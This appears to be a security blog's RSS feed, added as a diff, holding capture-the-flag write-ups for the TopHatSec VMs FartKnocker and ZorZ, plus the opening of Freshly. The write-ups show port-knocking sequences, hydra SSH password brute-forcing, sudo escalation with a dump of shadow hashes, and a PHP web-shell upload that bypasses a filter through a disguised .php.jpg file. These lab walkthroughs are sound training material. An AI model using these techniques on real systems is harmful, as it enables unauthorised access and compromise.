@@ -1,0 +1,1238 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Tophatsec on Cheesy Rumbles</title>
+    <link>http://rastamouse.me/categories/tophatsec/</link>
+    <description>Recent content in Tophatsec on Cheesy Rumbles</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Fri, 10 Apr 2015 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://rastamouse.me/categories/tophatsec/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>TopHatSec: FartKnocker</title>
+      <link>http://rastamouse.me/writeups/2015/fartknocker/</link>
+      <pubDate>Fri, 10 Apr 2015 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2015/fartknocker/</guid>
+      <description>
+
+&lt;p&gt;This VM has a focus on port knocking, the clues for which are buried in packet captures.&lt;/p&gt;
+
+&lt;h2 id=&#34;discovery:e5233222f13543d15163b8fc77c786fb&#34;&gt;Discovery&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -p- -A 192.168.56.103
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-title: Site doesn&#39;t have a title (text/html).
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;knock-once:e5233222f13543d15163b8fc77c786fb&#34;&gt;Knock Once&lt;/h2&gt;
+
+&lt;p&gt;The webpage on port 80 contains a simple HTML file, with a link to the first packet capture.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;html&amp;gt;
+&amp;lt;a href=&amp;quot;pcap1.pcap&amp;quot;&amp;gt;Wooah&amp;lt;/a&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So let&amp;rsquo;s download this and have a look in Wireshark.  There are 2 main sections separated by ICMP request/replies.&lt;/p&gt;
+
+&lt;p&gt;
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/fartknocker/pcap1.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/fartknocker/pcap1-2.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+&lt;/p&gt;
+
+&lt;p&gt;The first sequence of packets are SYN packets to ports &lt;code&gt;7000&lt;/code&gt;, &lt;code&gt;8000&lt;/code&gt; and &lt;code&gt;9000&lt;/code&gt;.  The second sequence are more SYN packets to ports &lt;code&gt;7000&lt;/code&gt;, &lt;code&gt;8000&lt;/code&gt;, &lt;code&gt;9000&lt;/code&gt; and &lt;code&gt;8888&lt;/code&gt;.
+Knocking these ports opens ports &lt;code&gt;8888&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# knock -v 192.168.56.103 7000 8000 9000 7000 8000 9000 8888; nc 192.168.56.103 8888
+hitting tcp 192.168.56.103:7000
+hitting tcp 192.168.56.103:8000
+hitting tcp 192.168.56.103:9000
+hitting tcp 192.168.56.103:7000
+hitting tcp 192.168.56.103:8000
+hitting tcp 192.168.56.103:9000
+hitting tcp 192.168.56.103:8888
+/burgerworld/
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;knock-twice:e5233222f13543d15163b8fc77c786fb&#34;&gt;Knock Twice&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl 192.168.56.103/burgerworld/
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;html&amp;gt;
+&amp;lt;a href=&amp;quot;pcap2.pcap&amp;quot;&amp;gt;heheh...hehh..&amp;lt;/a&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# wget 192.168.56.103/burgerworld/pcap2.pcap
+root@kali:~# wireshark pcap2.pcap 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;There are quite a few more packets this time, so I made the review a bit easier by putting a source IP filter in place.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/fartknocker/pcap2.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;This time we have a SYN on port &lt;code&gt;21&lt;/code&gt;, UDP packet on port &lt;code&gt;22&lt;/code&gt;, SYN on &lt;code&gt;80&lt;/code&gt; and a SYN on &lt;code&gt;8080&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# knock -v 192.168.56.103 21 22:udp 80 8080; nc 192.168.56.103 8080
+hitting tcp 192.168.56.103:21
+hitting udp 192.168.56.103:22
+hitting tcp 192.168.56.103:80
+hitting tcp 192.168.56.103:8080
+(UNKNOWN) [192.168.56.103] 8080 (http-alt) : Connection refused
+root@kali:~# knock -v 192.168.56.103 21 22:udp 80 8080; nc 192.168.56.103 8080
+hitting tcp 192.168.56.103:21
+hitting udp 192.168.56.103:22
+hitting tcp 192.168.56.103:80
+hitting tcp 192.168.56.103:8080
+
+                      MMMMMMM           MMMMMMH 
+                HMMMMM:::::::.MMMMMMMMMM:::::.TMM
+              MMMI:::::::::::::::::::MMH::::::::TM
+            MMIi::::::::::::.:::::::::::::::::::::MMMM
+           MT::::.::::::::::::::::::::::::::::::.::=T.IMMM
+         MMMi:::::::::::::::::::::::::::::::::::::::::::MT)MM
+     MMMI.:::::::::::::::::::::::::::::::::::::::::::.:::M= MM
+   XMXi::::::::::::::::::::::.:::::::::::::::::::::::::::::::=MM
+   MMi::::::::::::::::::::::::::::::::::::::::::::::::::.::..:=MMM
+  MM:MMT:::::::::.:::::::::::::::::.:::::::::::::::::::::::::::MiMM
+   MMM::::::::::::::::::.::::::::::::::::::::::::::.::::::::::.TM.MM
+   MMi::::::::::::::.::::::::::::::::::::::::::::::::::::::.:::.:: M
+   MM:::.::::::::::::::::::::::::::::::::.:.:::::::::::::::::::::: XM
+ MM:MT::.::::::::::::::::::::::::::::::::::::::::::::::::::::::::::XM
+IMM:::.::::::::::::::::::::::::::::::::::: :::::::::::::::::::::::.=M
+ MM::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: :::M
+ XMT:::::::::::::::::::::: ::::::::::::::::: : ::::::::::::::::::: iM
+   MiMi:::::::::: :::::::::::::::::::::::::::::::: ::::::::::::::.:IM
+     M::::::HH::::::::::::::::::::::::::::::::::::::::::::::::::::: M
+     MT:::::iM::::::::Hi:iXH:::ii::XH:::::::::::::.::::::::::::::.:.M
+      MX:::::iMX:i::::iMi:iMH::XH::Mi:::::::::::::::::::::::::::::: M
+        Mii::::HMH:::::iMH::MH=:MM=TMi::::::::::::::::::::::::::::::MM
+          MMMMMMMMMMMXTi:MMHi:HMMIMMMMii::::::::::::::::::::::::::::XM
+           XXOXMMT:. ::T= :IMMMMMMM=iXMii:::::::::::::::::::::::::: MM
+            MMMH:::.:::::::.::::.::::.:XMi::::::::::::::::::::::::::MM
+           XMM::.:.:..::..:.:.::.:.::: ::XMi::::::::::::::::::::::::MX
+          XMMT::::.:.::.::::.::.::::::::.::XH:::::::::::::::::::::: M
+          HMX::...:..::..:.:.::::::..... :::XX::::::::::::::.:::::. M
+          MM:::....:::::.::::::..:::::.:..:::HX::::::::::::::::::::=M
+          MX::::::::::::::::::::::..::::.:..::X::::::::::::::::::::IM
+         XMI..  .:.::....:..::::.:: ::...::.:.MH:::::::::::::::::.: M
+         MM:. ::..::....::.::::::....:.:...:..MT::.   ::::::::: :..IM
+         MM=:::::.::.:::::..::::.: .::..::..::Mi:::::::::::::::::: MM
+         MMI:::...:  .::..::::::.:::::::.::::TM:::::::::::::::::::=MO
+          MH.: .::::.::.. .:::::iLMXX=::::.:.Mi::::::: ::::::::::.MM
+          MX:.:..:: .:.:.:.: :MMM:::..:::::.HM:::: :::::::::::::.MM
+          MM:::...::....: ::IMT:::.:...:.::.MT::::::: ::::::::: MM
+           M=::..::::..:::MM:i:..::.:...: ::M:::: ::: ::::::::::MI
+           MH::: :.:.: MMMM=:::.:.:...:....iM::: ::::::  ::::::LM
+          MMMMT.::. ::TM:::::..::::::::.::.IM::::HH:::::::::::.MO
+           MM:LM::T:MT.:: .......:....:.:: TMMiXMT.MH:::.::::.:M=
+            M:. :::MMi:::MMMM=::::::.::..::=MMMMMMXMH:::.:::::MM
+           XMI: :..::=MX  :M::.......:...:::.MXTHM MH:::.: :.XM
+           MM XMMI IM    M   ................:: :MIIM:::::::MMO
+            MMXXMILM  .ML.= :.:::....:.:..::.:..:::MMT:::::TMM
+              MXMLMMMT::.:...:........ ....::.:.=.MMMM:::::MM
+              MHM=:: :.:::...::::.:...:.....:: =MMM==Mi::::M
+              MM=:::.......:.:.::.:.::...:.: ::  . ::=M:: MM
+             MMi:=XMMMi::::...:::::.::.:::::::::..: ::Mi:=MT
+            MM=:I::  :iMH==:::::.::.:::::::::::::::.::MT:XMT
+           MT=:=MMMMMMM=HM::::.::::::MMT=Mi::::::..:::MI=MM
+          M ::::::.=I= .MX:..: ::::.::MX::::.:::.:.  .XMMM
+         M:MMMMMMM=.::::  ::.::...:.MMIM::.:::.::..::::M
+                 M=:: : ::::.==XMMM:XMMM=:::.::.:.::::.M
+                 M=.IMMM )X   M  MMMMMM=:::..::..:::.::M
+                 MM  X  MMM:MMMMMMMMM=:::.:.:.. .:.::::M
+                  MIMMMMMMMMMMMMMMI::::::::.:::.:...:.:M
+                MMMMMMMMMMMMMX:.   .:..::....:...:::.:iM
+               MMMMMMMMMMI::::::.:.::...:....:.....:.:=M
+           MMMMMMMMMI:::::.:.. :.::.::..........:..:..:M
+            M=:  :..::..::.........::.......::.:.....: M
+             MMMi::::::.:.:==MMMMMMMMMT:.:.:::..:::..: OM
+               MM=::..: OMMMM         MMMT:::....:.::: :M
+                M=::::MM                MMI:::........:OM
+                 MMMMM                   MMH:::..::MMMMMM
+                                          MMMMMMMMMMMMMMM
+
+
+                     CAN YOU UNDERSTAND MY MESSAGE?!
+
+
+
+        eins drei drei sieben
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;knock-thrice:e5233222f13543d15163b8fc77c786fb&#34;&gt;Knock Thrice&lt;/h2&gt;
+
+&lt;p&gt;&lt;code&gt;eins drei drei sieben&lt;/code&gt; is German for &lt;code&gt;one three three seven&lt;/code&gt;&amp;hellip; &lt;code&gt;1337&lt;/code&gt;, get it ;)&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# knock -v 192.168.56.103 1 3 3 7; nc 192.168.56.103 1337
+hitting tcp 192.168.56.103:1
+hitting tcp 192.168.56.103:3
+hitting tcp 192.168.56.103:3
+hitting tcp 192.168.56.103:7
+(UNKNOWN) [192.168.56.103] 1337 (?) : Connection refused
+root@kali:~# knock -v 192.168.56.103 1 3 3 7; nc 192.168.56.103 1337
+hitting tcp 192.168.56.103:1
+hitting tcp 192.168.56.103:3
+hitting tcp 192.168.56.103:3
+hitting tcp 192.168.56.103:7
+/iamcornholio/
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl 192.168.56.103/iamcornholio/
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;html&amp;gt;
+T3BlbiB1cCBTU0g6IDg4ODggOTk5OSA3Nzc3IDY2NjYK
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This is a &lt;code&gt;base64&lt;/code&gt; encoded string.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# echo -en &amp;quot;T3BlbiB1cCBTU0g6IDg4ODggOTk5OSA3Nzc3IDY2NjYK&amp;quot; | base64 -d
+Open up SSH: 8888 9999 7777 6666
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;knock-four-ice:e5233222f13543d15163b8fc77c786fb&#34;&gt;Knock Four-ice?&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# knock -v 192.168.56.103 8888 9999 7777 6666; ssh 192.168.56.103
+hitting tcp 192.168.56.103:8888
+hitting tcp 192.168.56.103:9999
+hitting tcp 192.168.56.103:7777
+hitting tcp 192.168.56.103:6666
+ssh: connect to host 192.168.56.103 port 22: Connection refused
+root@kali:~# knock -v 192.168.56.103 8888 9999 7777 6666; ssh 192.168.56.103
+hitting tcp 192.168.56.103:8888
+hitting tcp 192.168.56.103:9999
+hitting tcp 192.168.56.103:7777
+hitting tcp 192.168.56.103:6666
+############################################
+# CONGRATS! YOU HAVE OPENED THE SSH SERVER #
+# USERNAME: butthead                       #
+# PASSWORD: nachosrule                     #
+############################################
+root@192.168.56.103&#39;s password: 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;ssh:e5233222f13543d15163b8fc77c786fb&#34;&gt;SSH&lt;/h2&gt;
+
+&lt;p&gt;It was very nice of it to give us the credentials for &lt;code&gt;butthead&lt;/code&gt;, but we get kicked off straight away.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# ssh butthead@192.168.56.103
+############################################
+# CONGRATS! YOU HAVE OPENED THE SSH SERVER #
+# USERNAME: butthead                       #
+# PASSWORD: nachosrule                     #
+############################################
+butthead@192.168.56.103&#39;s password: 
+Welcome to Ubuntu 14.04.2 LTS (GNU/Linux 3.13.0-46-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+Last login: Wed Apr  8 16:30:47 2015 from 192.168.56.101
+You are only logging in for a split second! What do you do!
+Connection to 192.168.56.103 closed.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We can get around this by simply placing a shell command to run at the end of the line, e.g:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# ssh butthead@192.168.56.103 id
+butthead@192.168.56.103&#39;s password: 
+uid=1001(butthead) gid=1001(butthead) groups=1001(butthead)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Of course, invoking &lt;code&gt;/bin/bash&lt;/code&gt; saves a lot of tediousness.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# ssh butthead@192.168.56.103 /bin/bash
+butthead@192.168.56.103&#39;s password: 
+
+id
+uid=1001(butthead) gid=1001(butthead) groups=1001(butthead)
+whoami
+butthead
+
+ls -l
+total 4
+-rw-rw-r-- 1 butthead butthead 67 Mar  3 00:33 nachos
+
+cat nachos
+Great job on getting this far.
+
+Can you login as beavis or root ?
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;getting-beavis:e5233222f13543d15163b8fc77c786fb&#34;&gt;Getting Beavis!&lt;/h2&gt;
+
+&lt;p&gt;This portion of the VM took me something like 6 hours!  Getting beavis&amp;rsquo; password was a complete pain &amp;gt;:D&lt;/p&gt;
+
+&lt;p&gt;I figured that the password would be Beavis and Butthead related.  So I used cEWL to pull words from various sources such as Wikipedia and IMDB quote pages.  I ran the wordlist through &lt;code&gt;hydra&lt;/code&gt; but no valid login was found :(&lt;/p&gt;
+
+&lt;p&gt;The final trick was to a) remove all spaces; b) convert all characters to lowercase.&lt;/p&gt;
+
+&lt;p&gt;Eventually&amp;hellip;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# hydra -l beavis -P wordlist -f -t 32 192.168.56.103 ssh
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+[22][ssh] host: 192.168.56.103   login: beavis   password: mikejudge
+[STATUS] attack finished for 192.168.56.103 (valid pair found)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# ssh beavis@192.168.56.103
+
+beavis@Huhuhhhhhuhuhhh:~$ id; whoami
+uid=1000(beavis) gid=1000(beavis) groups=1000(beavis),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),110(sambashare)
+beavis
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;root:e5233222f13543d15163b8fc77c786fb&#34;&gt;Root&lt;/h2&gt;
+
+&lt;p&gt;Beavis is a member of the &lt;code&gt;sudo&lt;/code&gt; group, making the escalation a trivial exercise.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;beavis@Huhuhhhhhuhuhhh:~$ sudo -l
+[sudo] password for beavis: 
+Matching Defaults entries for beavis on Huhuhhhhhuhuhhh:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User beavis may run the following commands on Huhuhhhhhuhuhhh:
+    (ALL : ALL) ALL
+beavis@Huhuhhhhhuhuhhh:~$ sudo -i
+
+root@Huhuhhhhhuhuhhh:~# cat /etc/shadow
+root:$6$iKFfVKIm$TChaO1huLt0YVVUKdQ./4/nPKa7hL96JRDUk0qzBt0Hl9MeYCzZD5cS9qaxxbzif78mX8XiO2seiukv0vPL48/:16497:0:99999:7:::
+beavis:$6$vL7Sn7xS$vmqKbPx1nahNiF8YmITZqgXhv89G/aMQSMJOfN5meoOQtcsIAxrlTyC/pUHwoDkWkkq2Umr7HawkiLrnYFqI11:16496:0:99999:7:::
+butthead:$6$wl1mxaMt$ginoPx9IAhi6WnJzrhH0bUDDhQVhLPWOvYAaT9Tf2hgauBiOxbNNY8WZMSSg1n0XEkvSoGKvV8EtibKg0AP1Y.:16497:0:99999:7::
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>TopHatSec: ZorZ</title>
+      <link>http://rastamouse.me/writeups/2015/zorz/</link>
+      <pubDate>Tue, 07 Apr 2015 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2015/zorz/</guid>
+      <description>
+
+&lt;p&gt;This VM contains 3 web application challenges, which focus on file upload and filter bypass.&lt;/p&gt;
+
+&lt;h2 id=&#34;discovery:67b7c5d17181120e8623e1b28dc920b5&#34;&gt;Discovery&lt;/h2&gt;
+
+&lt;p&gt;Only ports 22 and 80 are open.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -p- -A 192.168.56.102
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     (protocol 2.0)
+| ssh-hostkey: 
+|   1024 48:bb:d8:38:b8:25:a6:6c:5e:7f:67:c9:ec:53:cc:ed (DSA)
+|   2048 ec:55:48:93:28:90:f6:bf:3c:cd:e3:90:42:26:3b:5d (RSA)
+|_  256 3f:0a:11:c9:59:73:be:df:f7:77:59:65:07:91:d7:d6 (ECDSA)
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-title: Site doesn&#39;t have a title (text/html).
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
+SF-Port22-TCP:V=6.47%I=7%D=4/9%Time=5526DEE1%P=x86_64-unknown-linux-gnu%r(
+SF:NULL,29,&amp;quot;SSH-2\.0-OpenSSH_6\.6\.1p1\x20Ubuntu-2ubuntu2\r\n&amp;quot;);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Let&amp;rsquo;s head over to port 80 in a web browser.&lt;/p&gt;
+
+&lt;h2 id=&#34;level-1:67b7c5d17181120e8623e1b28dc920b5&#34;&gt;Level 1&lt;/h2&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/zorz/1/zorz.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;I downloaded an image off the Internet and uploaded it to the server.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/zorz/1/upload.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;The file uploads, which is good, but now I need to find it&amp;hellip; &lt;code&gt;/tmp/phpsu5a08&lt;/code&gt; was not valid (404), as was &lt;code&gt;/tmp/rastamouse.jpg&lt;/code&gt;.  So now it&amp;rsquo;s time to break out the web fuzzers!  I didn&amp;rsquo;t get any hits with my usual &lt;code&gt;wfuzz&lt;/code&gt; wordlists, but I did with &lt;code&gt;dirb&lt;/code&gt;.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/zorz/1/dirb.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;The interesting directory is &lt;code&gt;uploads2&lt;/code&gt;, though it turns out this is the directory for challenge 2.  So I manually tried &lt;code&gt;uploads1&lt;/code&gt; and found &lt;code&gt;rastamouse.jpg&lt;/code&gt; there.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/zorz/1/index.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;I took a copy of &lt;code&gt;/usr/share/webshells/php/php-simple-backdoor.php&lt;/code&gt; and uploaded it as &lt;code&gt;catflap1.php&lt;/code&gt;.  This was uploaded successfully, so it seems this level has no filtering or protection in place at all.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl http://192.168.56.102/uploads1/catflap1.php?cmd=id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;level-2:67b7c5d17181120e8623e1b28dc920b5&#34;&gt;Level 2&lt;/h2&gt;
+
+&lt;p&gt;Attempting to upload the same PHP file for level 2 fails miserably.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/zorz/2/sorry.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;If we intercept the request with &lt;code&gt;burp&lt;/code&gt;, we can see there&amp;rsquo;s a &lt;code&gt;Content-Disposition&lt;/code&gt; header.  Note the &lt;code&gt;filename&lt;/code&gt;, we will change this later.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/zorz/2/burp.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;I sent the POST to Burp Repeater and tried various things to get PHP uploaded.  After a few tried, I found that the following combination worked:  Injecting PHP code at the end of the image data and modifying the file extension (to force the server to process the PHP data).&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/zorz/2/burp2.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Content-Disposition: form-data; name=&amp;quot;upfile&amp;quot;; filename=&amp;quot;rastamouse.php.jpg&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/zorz/2/success.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;When you access the URL, the binary data for the image is display in gibberish, but at the very bottom the successful PHP is shown.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl http://192.168.56.102/uploads2/rastamouse.php.jpg
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/zorz/2/rce.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;curl http://192.168.56.102/uploads2/rastamouse.php.jpg?cmd=id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;To create the same file outside of Burp, it&amp;rsquo;s as simple as:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/vulnhub/zorz/2# cat rastamouse.jpg catflap2.php &amp;gt; catflap2.php.jpg
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;level-3:67b7c5d17181120e8623e1b28dc920b5&#34;&gt;Level 3&lt;/h2&gt;
+
+&lt;p&gt;It turns out that my file for Level 2 worked for Level 3 as well.  That was easy ^_^.&lt;/p&gt;
+
+&lt;p&gt;
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/zorz/3/zorz.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+&lt;/p&gt;
+
+&lt;p&gt;So let&amp;rsquo;s collect the flag.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ ls -l
+drwxr-xr-x 2 root     root     4096 Feb 18 22:45 l337saucel337
+
+$ ls -l l337saucel337
+-rw-r--r-- 1 root root 400 Feb 18 22:45 SECRETFILE
+
+$ cat l337saucel337/SECRETFILE
+Great job so far. This box has 3 uploaders.
+
+The first 2 are pure php, the last one is php w/jquery.
+
+To get credit for this challenge, please submit a write-up or instructions
+on how you compromised the uploader or uploaders. If you solve 1, 2, or all
+of the uploader challenges, feel free to shoot me an email and let me know!
+
+admin@top-hat-sec.com
+
+Thanks for playing!
+http://www.top-hat-sec.com
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>TopHatSec: Freshly</title>
+      <link>http://rastamouse.me/writeups/2015/freshly/</link>
+      <pubDate>Mon, 06 Apr 2015 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2015/freshly/</guid>
+      <description>
+
+&lt;p&gt;The goal of this challenge is to break into the machine via the web and find the secret hidden in a sensitive file.&lt;/p&gt;
+
+&lt;h2 id=&#34;discovery:c9074d49792693247d5874f03ce0ab60&#34;&gt;Discovery&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -p- -A 192.168.0.55
+
+PORT     STATE SERVICE  VERSION
+80/tcp   open  http     Apache httpd 2.4.7 ((Ubuntu))
